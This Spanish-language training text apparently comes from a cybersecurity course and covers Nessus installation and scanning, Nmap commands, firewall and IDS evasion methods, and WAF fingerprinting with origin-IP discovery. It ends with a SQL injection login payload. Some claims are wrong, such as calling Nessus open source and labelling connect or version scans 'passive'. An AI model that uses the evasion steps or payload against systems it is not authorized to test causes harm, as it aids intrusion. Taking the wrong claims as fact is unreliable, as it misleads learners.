- **Mejor velocidad**

Cuantos más usuarios se encuentren dentro de la red, menor será la velocidad y ancho de banda que se puede repartir. Esto se notará cuando utilicemos nuestra conexión a Internet para llevar a cabo cualquier actividad, empeorando de forma considerable la calidad de la conexión. Expulsando a los usuarios, liberamos el ancho de banda que estaban utilizando mejorando así la velocidad y el rendimiento general de la red.

- **Mayor privacidad**

Expulsando usuarios no autorizados, reducimos mucho la posibilidad de que estos **puedan acceder a la información personal**, la cual puede ser muy sensible. Al expulsarlos, mejoramos la privacidad de todos los usuarios de forma considerable. Es una buena forma de protegernos y de evitar que se realicen todo tipo de prácticas con nuestra dirección IP o usando nuestro acceso a Internet para ello.

- **Cumplir normativas**

Cuando se trata de alguna empresa u organización, tener usuarios no autorizados puede hacer que se esté incumpliendo alguna normativa o regulación. Expulsando a estos usuarios, nos aseguramos de que cumplimos con todo lo establecido en estas regulaciones. Reduciendo así el riesgo de que llegue alguna multa o sanción.

## Gestión de vulnerabilidades con Nessus

### **Nessus ¿Cómo hallar vulnerabilidades?**

Nessus es una herramienta muy utilizada durante un Pentesting, específicamente, en la fase de Escanéo. Este post estará dividido en dos partes: la primera consiste en una muy breve reseña de Nessus como producto y, en la segunda parte, se realiza una demostración de Nessus.

Nessus es el motor de detección de vulnerabilidades perteneciente a la empresa Tenable y es prácticamente el standard como herramienta para este proceso. Existen otras herramientas similares para realizar el hallazgo de vulnerabilidades, algunas con versiones gratuitas como OpenVAS y otras con muy buen desempeño como es Qualys.

Tenable permite utilizar su versión gratuita del motor de detección de vulnerabilidades Nessus para pequeños entornos, lo que a la vez permite empezar a interiorizarse en proceso de gestión de vulnerabilidades. Es por esto que realizaremos la instalación de Nessus en un entorno Windows como prueba de concepto y como laboratorio de práctica, sin que además esto impida su utilización en un ambiente de pequeña red como por ejemplo en un hogar o un pequeño negocio.

Las amenazas siempre estarán presentes tanto a nivel externo como interno en cualquier tipo de equipo pero sin duda que cuando se habla de entornos corporativos o de equipos donde existe información confidencial y extremadamente delicada, se corre el riego de que el robo de información se convierta en un verdadero dolor de cabeza. Para prevenir esto existe una distribución de Linux que esta desarrollada especialmente para todos los temas relacionados con análisis de vulnerabilidades.

<aside>
💡 Kali Linux entrega al usuario más de 600 herramientas de penetración, pero esta cantidad puede aumentarse usando herramientas extras y una de las más llamativas es Nessus.
</aside>

![Kali Linux 1](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/kali-linux1.png?raw=true)

### **¿Qué es Nessus?**

Es una herramienta utilizada principalmente para escanear vulnerabilidades, es desarrollada y mantenida por [Tenable](https://www.tenable.com/). Tiene un motor para escanear los objetivos que se basa en plugins; los plugins son pequeños programas escritos en un lenguaje de scripting denominado **Nessus Attack Scripting Language (NASL)** que le indican al motor que es lo que debe evaluar en el objetivo, con el fin de determinar las fallas del mismo.

Nessus se ha desarrollado como una herramienta de escaneo de seguridad remota la cual hace el escaneo al equipo remoto para generar las alertas y en caso de detectar alguna vulnerabilidad que ponga en riesgo tanto la información como los datos allí alojados. Para ello realiza más de 1200 verificaciones en el destino para analizar hasta el último byte la presencia de algún software que sea perjudicial.

### **¿Cuántos plugins tiene Nessus y quién los desarrolla?**

En la actualidad Nessus tiene más de 133.088 plugins, la mayor parte de estos plugins es desarrollado por la gente de Tenable y unos cuantos por la comunidad.

### **¿Qué tipo de licencias existen?**

Al momento de pensar en adquirir Nessus se va a encontrar con las siguientes opciones:

- **nessus essentials**: Una versión que está pensada para uso casero, puede realizar escaneos hasta en 16 direcciones IP
- **nessus professional:** Una versión comercial que permite realizar escaneos a host ilimitados, está enfocada a consultores y Pen Testers
- **tenable.io:** Esta versión está más enfocada a la gestión de vulnerabilidades en compañías de cualquier tamaño.

### Principales características de Nessus

Dentro de las principales características de Nessus destacamos:

- Nessus hace un análisis completo de la configuración del servidor y no se queda solo en los análisis tradicionales
- Dispone de información actualizada sobre nuevas vulnerabilidades y ataques que puedan poner en riesgo los datos e información
- Nessus es de código abierto
- Nessus está en la capacidad de ser implementado diversas plataformas incluyendo Raspberry Pi
- Dispone de complementos compilados dinámicamente para mejorar el rendimiento y la eficiencia de las tareas de escaneo
- Integra más de 450 plantillas preconfiguradas para una mejor administración de las vulnerabilidades a detectar
- Podemos crear reportes personalizados para obtener acceso a la información generada

<aside>
📖 Nessus trabaja haciendo un análisis en cada puerto del equipo para determinar el tipo de servicio que está en ejecución y de este modo realizar pruebas para validar que el servicio no tenga o presente vulnerabilidades que afecten la normal operación.
</aside>

### Requisitos mínimos

Los requisitos mínimos para usar Nessus son:

- CPU de 4 núcleos con velocidad de 2 GHz
- RAM de 4 GB recomendado 8 GB
- Espacio en disco duro de 30 GB

### Sistemas operativos disponibles

Nessus, aparte de Kali, puede ser instalado en sistemas operativos como:

- Debian 9, 10 / Kali Linux 2017 y Rolling (86x, i386)
- Red Hat 6, 7 8
- FreeBSD 11, 12
- SUSE Enterprise 11 SP4, 12 SP3
- Ubuntu 14 al 18
- Windows 7 al 11
- Mac OS X 10.9, 10.10, 10.11, 10.12, 10.13, 10,14, 10.15, 11.x y 12

### Navegadores

Adicional puede ser usado en los siguientes navegadores:

- Google Chrome (50+)
- Safari (10+)
- Mozilla Firefox (50+)

Ahora te enseñará cómo instalar Nessus en Kali Linux y gestionar equipos remotos para detectar sus vulnerabilidades.

## **¿Cómo instalar Nessus en Kali Linux?**

Vamos a la URL de Nessus para descargar el respectivo instalador: [NESSUS](https://www.solvetic.com/tutoriales/article/11878-como-instalar-y-usar-nessus-en-kali-linux/Nessus)

![Kali Linux 2](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/kali-linux2.png?raw=true)

Damos clic en el instalador de Debian para 64 bits:

![Kali Linux 3](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/kali-linux3.png?raw=true)

Aceptamos los términos de la licencia:

![Kali Linux 4](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/kali-linux4.png?raw=true)

Este archivo lo guardamos localmente. Abrimos la terminal de Kali Linux, accedemos a Descargas: usando el comando:

> cd Descargas

Listamos el contenido con "ls":

![Kali Linux 5](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/kali-linux5.png?raw=true)

Instalamos Nessus con el comando:

`sudo dpkg -i archivo.deb`

Ingresamos la contraseña y esperamos que finalice el proceso:

![Kali Linux 6](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/kali-linux6.png?raw=true)

Iniciamos el servicio de Nessus:

`sudo /bin/systemctl start nessusd.service`

Una vez iniciado, abrimos un navegador e ingresamos a Nessus:

`https://kali:8834`

Veremos lo siguiente:

![Kali Linux 7](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/kali-linux7.png?raw=true)

Damos clic en "Advanced" y luego damos clic en "Accept the Risk and Continue" para ir a Nessus:

![Kali Linux 8](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/kali-linux8.png?raw=true)

Este será el entorno inicial de Nessus:

![Kali Linux 9](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/kali-linux9.png?raw=true)

Seleccionamos "Nessus Essentials" y luego damos clic en "Continue", ingresamos el usuario a crear con un correo válido, damos clic en "Email" y luego Ingresamos el código recibido en el correo registrado:

![Kali Linux 10](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/kali-linux10.png?raw=true)

Asignamos el usuario y contraseña de Nessus. Damos clic en "Submit" y se iniciará el proceso de descarga de los complementos:

![Kali Linux 11](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/kali-linux11.png?raw=true)

Ahora se lleva a cabo el proceso de compilación de los componentes.  Esperamos que el proceso, el cual tarda, vaya finalizando:

![Kali Linux 12](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/kali-linux12.png?raw=true)

Al finalizar veremos lo siguiente:

![Kali Linux 13](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/kali-linux13.png?raw=true)

Cierra la ventana emergente para ver el entorno de Nessus:

![Kali Linux 14](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/kali-linux14.png?raw=true)

### **Escanear y buscar vulnerabilidades con Nessus**

Damos clic en "New Scan" y seleccionamos el tipo de escaneo a usar, como vemos las opciones son variadas:

![Nessus1](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/nessus1.png?raw=true)

**Las opciones de escaneo que nos ofrece Nessus son:**

- Host Discovery: Ejecuta un escaneo sencillo para descubrir hosts activos y puertos abiertos
- Basic Network Scan: Hace un análisis completo del sistema necesario para cualquier host seleccionado, es ideal para analizar vulnerabilidades internas
- Advanced Scan: Este análisis permite personalizar la configuración del escaneo
- Advanced Dynamic Scan: Permite configurar filtros de complementos dinámicos sin tener que hacerlo de forma manual
- Malware Scan: Como su nombre lo indica, busca malware en sistemas Windows y Unix
- Mobile Device Scan: Permite realizar análisis a dispositivos móviles usando Microsoft Exchange o un MDM
- Web Application Tests: Es funcional para buscar vulnerabilidades web publicadas y no publicadas o desconocidas
- Credentialed Patch Audit: Ejecuta una auditoría de parches con credenciales
- Intel AMT Security Bypass: Se encarga de realizar comprobaciones remotas y locales para CVE-2017-5689
- Spectre and Meltdown: Se encarga de llevar a cabo verificaciones remotas y locales para CVE-2017-5753, CVE-2017-5715 y CVE-2017-5754
- WannaCry Ransomeware: Busca el famoso ransomware WannaCry
- Ripple20 Remote Scan: Ubica equipos que ejecutan la pila Treck en la red
- Zerologon Remote Scan: Detecta la vulnerabilidad de elevación de privilegios (Zerologon) propia de Microsoft Netlogon
- Solarigate: Permite encontrar vulnerabilidades de SolarWinds Solorigate usando comprobaciones remotas y locales
- ProxyLogon: MS Exchange: ejecuta comprobaciones remotas y locales para detectar vulnerabilidades de Microsoft Exchange Server
- PrintNightmare: Hace análisis y verificaciones locales para CVE-2021-34527, es una vulnerabilidad PrintNightmare Windows Print Spooler
- Active Directory Starter Scan: Busca configuraciones incorrectas en Active Directory
- Log4Shell: Puede detectar la vulnerabilidad Log4Shell en Apache Log4j
- Compliance: Hace una auditoría de la infraestructura de la nube y audita la configuración de servicios en la nube de terceros
- Internal PCI Network Scan: Lleva a cabo un análisis de vulnerabilidad PCI DSS interno
- MDM Config Audit: Audita la configuración de los administradores de dispositivos móviles MDM
- Offline Config Audit: Hace una auditoria de la configuración de los dispositivos de red locales
- Policy Compliance Auditing: Lleva a cabo una auditoria de las configuraciones del sistema tomando como base una línea de base existente
- SCAP and OVAL Auditing: Analiza sistemas de auditoría a través de definiciones SCAP y OVAL

Podemos ver como las opciones son variadas y funcionales.

Damos clic en "Basic Network Scan" para un escaneo básico e ingresamos los detalles del escaneo con la IP objetivo:

![Nessus2](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/nessus2.png?raw=true)

![Nessus3](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/nessus3.png?raw=true)

Damos clic en "Save" para guardar este proyecto:

![Nessus4](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/nessus4.png?raw=true)

Damos clic en el icono "Launch" para iniciar el escaneo en el equipo de destino:

![Nessus5](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/nessus5.png?raw=true)

Esperamos que el escaneo sea realizado, al finalizar pulsamos sobre el objetivo para ver las vulnerabilidades encontradas:

![Nessus6](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/nessus6.png?raw=true)

Cada una estará dividida por colores en base a su nivel de riesgo indicando la cantidad y al lado podemos ver una representación de estas, damos clic sobre alguna sección para ver más específicamente las vulnerabilidades detectadas:

![Nessus7](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/nessus7.png?raw=true)

Es posible ver un resumen de todas las vulnerabilidades de ese tipo y damos clic en algún elemento para tener acceso a detalles más completos:

![Nessus8](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/nessus8.png?raw=true)

Es posible guardar un reporte del análisis ejecutado, para ello damos clic en "Report":

![Nessus9](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/nessus9.png?raw=true)

Se abrirá la siguiente ventana donde seleccionamos el formato y detalles a usar:

![Nessus10](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/nessus10.png?raw=true)

Damos clic en "Generate Report" y después de creado lo abrimos o guardamos. Este reporte contendrá todo el resultado generado por Nessus. Navegamos por las diferentes paginas para ver los resultados:

![Nessus11](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/nessus11.png?raw=true)

Nessus es una valiosa herramienta de escaneo remoto para encontrar vulnerabilidades y tomar acciones sobre ellas antes que sea tarde.

# Instalación de Nessus Essentials en Windows 10

1. Descargar Nessus Essentials: [nessus](https://es-la.tenable.com/products/nessus)

![Nessus12](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/nessus12.png?raw=true)

2. Un correo electrónico: será la dirección en la cual recibiremos el código de activación de Nessus

## Instalación

Si nos registramos en el sitio para iniciar la prueba recibiremos un correo con la licencia y un link de descarga para diversas plataformas

![Nessus13](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/nessus13.png?raw=true)

Descargamos para el Sistema Operativo que corresponda, en este caso para Windows:

![Nessus14](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/nessus14.png?raw=true)

Una vez descargado procedemos a la instalación:

![Nessus15](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/nessus15.png?raw=true)

Next:

![Nessus16](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/nessus16.png?raw=true)

Aceptar la licencia:

![Nessus17](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/nessus17.png?raw=true)

Escoger el directorio de destino:

![Nessus18](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/nessus18.png?raw=true)

Install (luego aceptar cuando Windows consulte si desea que esta aplicación realice cambios en el equipo):

![Nessus19](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/nessus19.png?raw=true)

Esperamos que termine la instalación, podría solicitar la instalación de componentes adicionales necesarios:

![Nessus20](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/nessus20.png?raw=true)

![Nessus21](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/nessus21.png?raw=true)

![Nessus22](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/nessus22.png?raw=true)

![Nessus23](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/nessus23.png?raw=true)

El driver WinPcap debemos instalarlo con la opción de iniciarlo al inicial el sistema, tal como muestra la foto:

![Nessus24](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/nessus24.png?raw=true)

Finalizar la instalación de componentes adicionales:

![Nessus25](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/nessus25.png?raw=true)

Finalizar la instalación de Nessus:

![Nessus26](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/nessus26.png?raw=true)

Luego inciar el navegador del sistema en localhost:8834

![Nessus27](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/nessus27.png?raw=true)

Como el certificado de conexión segura es auto firmado debemos aceptar la opción de ingresar a pesar de las advertencias de seguridad:

![Nessus28](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/nessus28.png?raw=true)

En la siguiente etapa escogemos Nessus Essentials:

![Nessus29](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/nessus29.png?raw=true)

Como ya tenemos nuestro código de activación, en este caso presionamos Skip, caso contrario en esta etapa se puede solicitar un código de activación que llegará al correo electrónico indicado:

![Nessus30](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/nessus30.png?raw=true)

Ingresamos el código de activación:

![Nessus31](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/nessus31.png?raw=true)

Creamos una cuenta de usuario administrador, en este ejemplo le puse de nombre "admin" :

![Nessus32](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/nessus32.png?raw=true)

Esperamos que compile el resto del sistema y actualice la información de vulnerabilidades:

![Nessus33](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/nessus33.png?raw=true)

![Nessus34](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/nessus34.png?raw=true)

Una vez que esto esté completado, en la primera vez que ingresemos nos solicitará que ingresemos nuestro segmento de red actual para realizar una búsqueda de equipos, generalmente la red doméstica es 192.168.0.0/24. En mi caso es 192.168.1.0/24, esto se puede ver fácilmente en Windows ingresando el comando “ipconfig”.

![Nessus35](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/nessus35.png?raw=true)

Aquí tomamos los 3 primeros octetos de nuestra dirección de red como base, asumiendo que estamos en un segmento con máscara 24 (configuración doméstica estándard), por tanto el segmento de red que debo analizar es 192.168.1.0/24

![Nessus36](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/nessus36.png?raw=true)

Una vez iniciada la búsqueda de activos aparecerán para seleccionar aquellos en los cuales desea realizar un análisis de vulnerabilidades inicial:

![Nessus37](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/nessus37.png?raw=true)

![Nessus38](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/nessus38.png?raw=true)

Selecciono todos aquellos que se encuentren en mi red y quiero analizar, en mi caso no analizaré la IP 1 ya que es la del router doméstico:

![Nessus39](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/nessus39.png?raw=true)

Una vez que iniciemos el análisis aparecerán los activos con los hallazgos correspondientes

![Nessus40](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/nessus40.png?raw=true)

Una vez terminado este análisis podremos ver que ya realizamos un descubrimiento de hosts y un análisis básico de la red, vamos a “My Basic Network Scan”:

![Nessus41](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/nessus41.png?raw=true)

Aparecerán todos los hosts analizados y sus vulnerabilidades

![Nessus42](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/nessus42.png?raw=true)

Ingresando a los detalles de cada host podemos ver cuales son los hallazgos de cada uno

![Nessus43](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/nessus43.png?raw=true)

Y posteriormente en cada vulnerabilidad:

![Nessus44](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/nessus44.png?raw=true)

También podemos ver los detalles de cada vulnerabilidad y una sugerencia de remediación:

![Nessus45](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/nessus45.png?raw=true)

### **Conclusión**

Nessus Essentials es una forma relativamente simple para realizar búsqueda de vulnerabilidades en pequeños entornos domésticos o de pequeños negocios, su capacidad gratuita de 16 IP máximo permite realizar diversos tipos de búsquedas de agujeros de seguridad en nuestros equipos, ya la vez entrega la capacidad de conocer el cómo solucionar estos problemas.

# Escaneo con Nmap: Análisis activo y pasivo

## **Diferencia entre análisis activo y pasivo con Nmap**

![Nmap](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/nmap.png?raw=true)

Nmap (Network Mapper) es una herramienta de código abierto utilizada para exploración de redes y auditoría de seguridad. En el contexto de Nmap, se pueden realizar análisis activos y pasivos para obtener información sobre los sistemas en una red. Aquí hay una breve diferencia entre ambos:

## **Análisis Activo:**

**Definición**: El análisis activo implica enviar paquetes directamente a los objetivos para obtener información sobre sus servicios, puertos y sistemas operativos.

<aside>
👉 Ejemplo con Nmap: Nmap enviará paquetes de solicitud a los puertos de destino y analizará las respuestas para determinar si los puertos están abiertos, qué servicios están en ejecución y posiblemente la versión del software.
</aside>

### Características:

- Es más intrusivo ya que implica interactuar directamente con los sistemas objetivo.
- Puede ser detectado más fácilmente por los sistemas de seguridad de red.

## **Análisis Pasivo:**

**Definición**: El análisis pasivo implica escuchar o capturar el tráfico de red sin interactuar directamente con los sistemas objetivo.

<aside>
👉 Ejemplo con Nmap: Nmap podría utilizar la opción -sn (Ping de Descubrimiento) para enviar paquetes de solicitud de ping y determinar la presencia de sistemas sin enviar paquetes directos a los puertos.
</aside>

### Características:

- Es menos intrusivo y generalmente más discreto, ya que no envía paquetes directamente a los sistemas objetivo.
- Puede ser más difícil de detectar, ya que no interactúa directamente con los sistemas de la red.

### **Consideraciones Adicionales:**

> **Propósito:**

- El análisis activo es más adecuado cuando se necesita obtener información detallada y actualizada sobre los sistemas objetivo.
- El análisis pasivo puede ser preferible cuando se busca recopilar información sin alertar a los sistemas objetivo.

> **Riesgos:**

- El análisis activo puede generar tráfico en la red, lo que podría ser detectado y monitoreado por dispositivos de seguridad.
- El análisis pasivo generalmente tiene menos riesgos de detección, pero puede tener limitaciones en términos de la cantidad y calidad de la información recopilada.

> **Combinación:**

- En muchos escenarios, se emplea tanto el análisis activo como el pasivo para obtener una imagen más completa de la red y sus sistemas.

<aside>
📖 Tanto el análisis activo como el pasivo tienen sus casos de uso y deben utilizarse de manera ética y legal, respetando las políticas de seguridad y privacidad de la red objetivo.
</aside>

## **Ejemplos de análisis activo con Nmap**

Aquí te proporciono algunos ejemplos de comandos Nmap para realizar análisis activos, centrándose en la exploración de servicios y puertos en un objetivo específico. Ten en cuenta que estos ejemplos son solo ilustrativos y debes asegurarte de tener la debida autorización para escanear cualquier red.

### Escaneo de Puertos Básico:

> nmap [objetivo]

Este comando realiza un escaneo de puertos básico en el objetivo especificado.

### Escaneo de Puertos con Información del Servicio:

> nmap -sV [objetivo]

Proporciona información sobre los servicios que se están ejecutando en los puertos encontrados.

### Escaneo de Puertos con Detección de Sistema Operativo:

> nmap -O [objetivo]

Intenta detectar el sistema operativo del objetivo además de realizar un escaneo de puertos.

### Escaneo de Puertos en un Rango Específico:

> nmap -p 1-100 [objetivo]

Limita el escaneo a un rango específico de puertos (en este caso, del puerto 1 al 100).

### Escaneo Agresivo:

> nmap -A [objetivo]

Realiza un escaneo agresivo que incluye detección de servicio, detección de sistema operativo y scripts de secuencia de comandos.

### Escaneo de Puertos UDP:

> nmap -sU [objetivo]

Realiza un escaneo de puertos UDP, que son utilizados para servicios como DNS y DHCP.

### Escaneo de Puertos con Registro de Script:

> nmap -sC [objetivo]

Ejecuta scripts de detección de servicios y vulnerabilidades.

### Escaneo de Puertos con Formato de Salida Específico:

> nmap -oN resultado.txt [objetivo] 

Guarda los resultados en un archivo de texto específico.

<aside>
💡 Recuerda sustituir [objetivo] con la dirección IP o el nombre de host del objetivo que estás evaluando. Ten presente que realizar escaneos activos en redes o sistemas sin la debida autorización puede violar políticas de seguridad y leyes, así que siempre asegúrate de contar con permisos antes de utilizar Nmap.
</aside>

## **Ejemplos de Análisis Pasivo con Nmap**

Nmap, por naturaleza, es más conocido por realizar análisis activos, ya que envía paquetes a los sistemas objetivo para recopilar información. Sin embargo, hay algunas técnicas que pueden considerarse más pasivas en comparación con un escaneo tradicional. Aquí te presento algunas opciones:

### Ping de Descubrimiento:

> nmap -sn [objetivo]

Este comando realiza un "Ping de Descubrimiento" para detectar sistemas activos sin enviar paquetes directos a puertos.

### Detección de Sistemas Operativos sin Escaneo de Puertos:

> nmap -O --unprivileged [objetivo]

Realiza una detección de sistemas operativos sin escanear puertos. Utiliza opciones "--unprivileged" para evitar requerir privilegios de root.

### Escaneo de Puertos TCP Connect:

> nmap -sT [objetivo]

El escaneo de puertos TCP Connect puede considerarse más pasivo que otros métodos, ya que establece una conexión completa con el objetivo.

### Escaneo de Red sin Resolver Nombres de Host:

> nmap -n [red]

Al utilizar la opción -n, Nmap no intentará resolver nombres de host, lo que puede considerarse más pasivo en comparación con la resolución de nombres.

### Escaneo de Puertos Service Version sin Ping:

> nmap -sV -Pn [objetivo]

Realiza un escaneo de versión de servicio sin enviar pings para determinar sistemas activos.

### Escaneo de Puertos UDP sin Resolver Nombres de Host:

> nmap -sU -n [objetivo]

Realiza un escaneo de puertos UDP sin resolver nombres de host, lo que puede ser considerado más pasivo en comparación con escaneos intensivos.

<aside>
💡 Es importante señalar que, aunque estos ejemplos son menos intrusivos, aún pueden generar tráfico en la red y, en algunos casos, ser detectados por sistemas de seguridad. Además, siempre se debe obtener la debida autorización antes de realizar cualquier tipo de escaneo o evaluación en una red o sistema.
</aside>

# Técnicas de evasión de firewall

## **Técnicas empleadas por los cortafuegos**

Los firewalls emplean al menos una de las siguientes técnicas para realizar un seguimiento del tráfico de la red:

1. **Filtrado de paquetes** : la mayoría de los firewalls son de este tipo. Pequeños fragmentos de datos llamados paquetes son examinados por una serie de filtros cuando intentan ingresar a la red. Luego, según el origen y el destino de las direcciones IP, protocolos y puertos, el firewall decide si se les permite ingresar o no.
2. **Firewall de aplicación/puerta de enlace**: al filtrar el tráfico a nivel de aplicación. Para evitar conexiones directas entre el dispositivo y los paquetes entrantes, los servidores proxy actúan como intermediarios.
3. **Firewall de próxima generación** (NGFW): para defenderse contra ataques de red y basados ​​en la web, estos sofisticados firewalls integran tecnologías clásicas de firewall de red con firewalls de aplicaciones web (WAF). Un NGFW también incluye funciones adicionales que incluyen antivirus, inspección de tráfico cifrado y sistemas de prevención de intrusiones (IPS). La inspección profunda de paquetes, que examina los datos en la carga útil del paquete en lugar de simplemente el encabezado del paquete, es una característica de un NGFW.
4. **Inspección de estado** : esta es una técnica más reciente que examina el paquete en busca de rasgos distintivos particulares mientras compara componentes importantes del paquete con una base de datos. Se permite que el paquete pase si hay una coincidencia razonable.

> "**No permita que su firewall se convierta en un eslabón débil en su estrategia de ciberseguridad **"

# **Métodos de evasión**

A pesar de que **los firewalls y los IDS** pueden impedir que paquetes maliciosos entren en una red, un atacante puede enviar paquetes modificados al objetivo para que pueda superar el IDS/Firewall. Estos son diez métodos de evasión:

1. **Cifrar datos** : al cifrar los datos que se transmiten, resulta más difícil para el firewall o el sistema de detección de intrusos detectar cualquier actividad maliciosa.
2. **VPN** : una red privada virtual (VPN) puede ayudar a eludir los firewalls y los sistemas de detección de intrusiones al enrutar el tráfico a través de un servidor seguro.
3. **Servidor proxy** : un servidor proxy puede ayudar a enmascarar el origen del tráfico, lo que dificulta que el firewall o el sistema de detección de intrusos rastreen el origen de un ataque.
4. **TOR** : La red TOR puede ayudar a ocultar la identidad del usuario y el origen del tráfico, lo que dificulta que el firewall o el sistema de detección de intrusiones detecten cualquier actividad maliciosa.
5. **Salto de puerto** : al cambiar constantemente el puerto utilizado para transmitir datos, resulta más difícil para el firewall o el sistema de detección de intrusos detectar cualquier actividad maliciosa.
6. **Esteganografía** : al ocultar datos dentro de otro archivo o mensaje, resulta más difícil para el firewall o el sistema de detección de intrusos detectar cualquier actividad maliciosa.
7. **Protocolos de capa de aplicación** : al utilizar protocolos de capa de aplicación como HTTP o SMTP, resulta más difícil para el firewall o el sistema de detección de intrusos detectar cualquier actividad maliciosa.
8. **Código malicioso:** al utilizar código malicioso o malware, resulta más difícil para el firewall o el sistema de detección de intrusiones detectar cualquier actividad maliciosa.
9. **Ingeniería social** : al engañar a los usuarios para que divulguen información confidencial o realicen determinadas acciones, resulta más fácil para un atacante eludir el firewall o el sistema de detección de intrusos.
10. **Acceso físico** : al acceder físicamente a la red o al sistema, un atacante puede eludir el firewall o el sistema de detección de intrusos.
11. **Software obsoleto**: los cortafuegos dependen del software para funcionar correctamente y este software debe actualizarse periódicamente para mantenerse al día con las últimas amenazas. Si no actualiza su software de firewall, puede volverse vulnerable a ataques descubiertos desde la última actualización.
12. **Contraseñas débiles:** una contraseña segura y única es una de las formas más importantes de proteger su firewall contra violaciones. Si utiliza una contraseña débil o fácil de adivinar, los hackers pueden acceder fácilmente a su firewall y comprometer su sistema.
13. **Acceso remoto no seguro:** si permite el acceso remoto a su sistema, es esencial proteger este acceso con una contraseña segura y autenticación de dos factores. Si no se toman estas medidas, los hackers pueden potencialmente obtener acceso a su firewall a través de acceso remoto.
14. **Reglas configuradas incorrectamente :** los firewalls se basan en reglas para determinar qué tráfico está permitido y qué está bloqueado. Si estas reglas no se configuran correctamente, es posible que se permita que tráfico no deseado atraviese el firewall y comprometa su sistema.

> Para proteger su firewall contra violaciones, es esencial actualizar periódicamente su software, usar contraseñas seguras, protegerse contra infecciones de malware, proteger el acceso remoto y configurar correctamente las reglas de su firewall.

## **Cómo evadir un WAF**

### **¿Qué hacer para encontrar el proveedor de WAF y la dirección IP real?**

**Divulgación de propiedad intelectual real**

> 1. EJECUTE shodan.io o censys.io
> 
> 
> 2. Busque registros SPF y registros TXT.
> 

Los registros SPF y TXT pueden tener una dirección IP de un punto de origen sin CloudFlare.

> 3. También puede consultar securitytrails.com en el campo Los datos históricos pueden tener IP original en registros antiguos.

**Cómo probar que WAF esté configurado correctamente:**

- Los WAF utilizan los puertos estándar 80, 443, 8000, 8008, 8080 y 8088.
- Los WAF configuran sus propias cookies en las solicitudes.
- Los WAF se asocian con encabezados separados.
- Los WAF se exponen en el encabezado del servidor.
- Los WAF se exponen en el contenido de la respuesta.
- Los WAF responden con códigos de respuesta únicos ante solicitudes maliciosas.
- Envíe una solicitud GET estándar desde un navegador, intercepte y registre encabezados de respuesta (cookies específicas).
- Envíe una solicitud desde la línea de comando (por ejemplo, cURL) y luego verifique el contenido y los encabezados de la respuesta.
- Envíe solicitudes GET a puertos abiertos aleatorios y verifique pancartas que puedan exponer la identidad de los WAF.
- Pruebe algunas cargas útiles de inyección SQL como: ”o 1 = 1: para iniciar sesión en formularios u olvidar una contraseña.
